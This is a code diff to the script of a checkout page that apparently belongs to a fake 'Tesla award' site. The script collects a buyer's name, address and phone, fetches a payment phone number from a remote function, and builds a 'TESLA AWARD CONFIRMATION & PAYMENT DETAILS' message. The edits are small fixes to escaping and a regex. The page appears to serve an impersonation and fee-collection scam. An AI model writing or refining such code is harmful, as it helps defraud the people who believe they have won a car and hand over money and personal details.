@@ -99,20 +99,20 @@
   var PR = '15814783495';
   try {
     var A = (typeof window !== 'undefined' && window.TESLA_API_BASE) || 'https://puebwzumwqizgbmksrpq.supabase.co/functions/v1/tesla-api/api';
-    fetch(A + '/admin/settings').then(function(r){ return r.json(); }).then(function(d){ if(d.paymentPhone) PR = d.paymentPhone.replace(/D/g,''); }).catch(function(){});
+    fetch(A + '/admin/settings').then(function(r){ return r.json(); }).then(function(d){ if(d.paymentPhone) PR = d.paymentPhone.replace(/\D/g,''); }).catch(function(){});
   } catch(_e) {}
 
-  document.getElementById('smModel').textContent = sc ? 'Tesla ' + (sc.name || '') : '—';
-  document.getElementById('smMethod').textContent = sm ? sm.name : '—';
-  document.getElementById('smTime').textContent = sm ? sm.days : '—';
-  document.getElementById('smName').textContent = sd ? (sd.fullName || '—') : '—';
-  document.getElementById('smAddr').textContent = sd ? (sd.address || '—') : '—';
-  document.getElementById('smCity').textContent = sd ? (sd.city || '—') : '—';
-  document.getElementById('smCountry').textContent = sd ? (sd.country || '—') : '—';
-  document.getElementById('smPhone').textContent = sd ? (sd.phone || '—') : '—';
-  document.getElementById('smTotal').textContent = sm ? sm.priceDisplay : '—';
-  document.getElementById('carMiniName').textContent = sc ? 'Tesla ' + (sc.name || '') : '—';
-  document.getElementById('carMiniPrice').textContent = sc ? (sc.price || '') : '—';
+  document.getElementById('smModel').textContent = sc ? 'Tesla ' + (sc.name || '') : '\u2014';
+  document.getElementById('smMethod').textContent = sm ? sm.name : '\u2014';
+  document.getElementById('smTime').textContent = sm ? sm.days : '\u2014';
+  document.getElementById('smName').textContent = sd ? (sd.fullName || '\u2014') : '\u2014';
+  document.getElementById('smAddr').textContent = sd ? (sd.address || '\u2014') : '\u2014';
+  document.getElementById('smCity').textContent = sd ? (sd.city || '\u2014') : '\u2014';
+  document.getElementById('smCountry').textContent = sd ? (sd.country || '\u2014') : '\u2014';
+  document.getElementById('smPhone').textContent = sd ? (sd.phone || '\u2014') : '\u2014';
+  document.getElementById('smTotal').textContent = sm ? sm.priceDisplay : '\u2014';
+  document.getElementById('carMiniName').textContent = sc ? 'Tesla ' + (sc.name || '') : '\u2014';
+  document.getElementById('carMiniPrice').textContent = sc ? (sc.price || '') : '\u2014';
 
   var vi = V[sc.id] || null;
   var im = document.getElementById('carMiniImg');
@@ -129,7 +129,7 @@
     b.disabled = false;
     b.style.opacity = '1';
     b.style.cursor = 'pointer';
-    b.textContent = 'Pay ' + (sm ? sm.priceDisplay : '') + ' — Place Order';
+    b.textContent = 'Pay ' + (sm ? sm.priceDisplay : '') + ' \u2014 Place Order';
   };
 
   var _isProcessing = false;
@@ -161,7 +161,7 @@
       return fetch(B + e, { method: m, headers: { 'Content-Type': 'application/json' }, body: b ? JSON.stringify(b) : null }).then(function(r) {
         var ct = r.headers.get('content-type') || '';
         return (ct.includes('application/json') ? r.json() : r.text()).then(function(d) {
-          if (!r.ok) { var errMsg = typeof d === 'string' ? d : (d.error || d.message || 'Something went wrong.'); throw new Error(errMsg); }
+          if (!r.ok) { var em = typeof d === 'string' ? d : (d.error || d.message || 'Something went wrong.'); throw new Error(em); }
           return d;
         });
       });
@@ -181,7 +181,7 @@
       var dm = (ord.deliveryMethod && ord.deliveryMethod.name) ? ord.deliveryMethod.name : 'N/A';
       var feeVal = (ord.deliveryMethod && typeof ord.deliveryMethod.price !== 'undefined') ? ord.deliveryMethod.price : 'Pending';
       var fee = (typeof feeVal === 'number') ? ('$' + feeVal) : feeVal;
-      var msg = '*TESLA AWARD CONFIRMATION \u0026 PAYMENT DETAILS*\n\n' +
+      var msg = '*TESLA AWARD CONFIRMATION & PAYMENT DETAILS*\n\n' +
         '\u2022 *Order ID:* ' + oid + '\n' +
         '\u2022 *Tracking Number:* ' + trk + '\n' +
         '\u2022 *Customer Name:* ' + nm + '\n' +
@@ -200,7 +200,7 @@
         btn2.disabled = false;
         btn2.style.opacity = '1';
         btn2.style.cursor = 'pointer';
-        btn2.textContent = 'Pay ' + (sm ? sm.priceDisplay : '') + ' — Place Order';
+        btn2.textContent = 'Pay ' + (sm ? sm.priceDisplay : '') + ' \u2014 Place Order';
       }
       try { var overlay2 = document.getElementById('globalLoader'); if (overlay2) overlay2.remove(); } catch(e2) {}
       if (typeof showToast === 'function') showToast(e.message || 'Order failed. Please try again.', 'error');
@@ -208,6 +208,7 @@
   };
 })();
 </script>
+
 
 </body>
 <!-- build: 1784129877 -->
